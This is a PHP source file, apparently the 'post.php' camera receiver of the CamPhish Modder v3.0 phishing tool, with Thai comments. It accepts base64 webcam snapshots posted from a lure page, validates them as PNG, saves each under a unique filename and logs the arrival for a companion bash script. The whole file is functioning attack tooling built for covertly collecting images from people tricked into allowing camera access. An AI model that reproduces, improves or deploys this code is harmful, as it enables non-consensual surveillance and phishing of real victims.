<?php
// CamPhish Modder v3.0 - post.php (stable camera receiver)
header('Content-Type: application/json');

$imageData = isset($_POST['cat']) ? $_POST['cat'] : '';

if (empty($imageData)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'No image data provided']);
    exit;
}

// จำกัดขนาดกันดิสก์เต็ม (dataURL ~2MB ปกติ, เผื่อเหลือ 10MB)
if (strlen($imageData) > 10 * 1024 * 1024) {
    http_response_code(413);
    echo json_encode(['status' => 'error', 'message' => 'Image too large']);
    exit;
}

$commaPos = strpos($imageData, ',');
if ($commaPos === false) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid image data']);
    exit;
}

$filteredData = substr($imageData, $commaPos + 1);
if (empty($filteredData)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid image data']);
    exit;
}

$unencodedData = base64_decode($filteredData, true);
if ($unencodedData === false || strlen($unencodedData) < 100) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Base64 decode failed']);
    exit;
}

// ตรวจว่าเป็น PNG จริง (magic bytes) กันไฟล์ขยะ
if (substr($unencodedData, 0, 8) !== "\x89PNG\x0D\x0A\x1A\x0A") {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Not a PNG image']);
    exit;
}

// ชื่อไฟล์ unique กันชนกันวินาทีเดียวกัน: cam_01012026_120000_a1b2c3.png
$date = date('dMYHis');
$uniq = substr(md5(uniqid((string)mt_rand(), true)), 0, 6);
$filename = 'cam' . $date . '_' . $uniq . '.png';

$fp = @fopen($filename, 'wb');
if ($fp === false) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Could not create image file']);
    exit;
}
fwrite($fp, $unencodedData);
fclose($fp);

// marker ให้ bash รู้ว่ามีรูปใหม่ (ไฟล์เดียวต่อรูป)
@file_put_contents("Log.log", "Received $filename\r\n", FILE_APPEND | LOCK_EX);

echo json_encode(['status' => 'success', 'message' => 'Image saved', 'file' => $filename]);
exit;
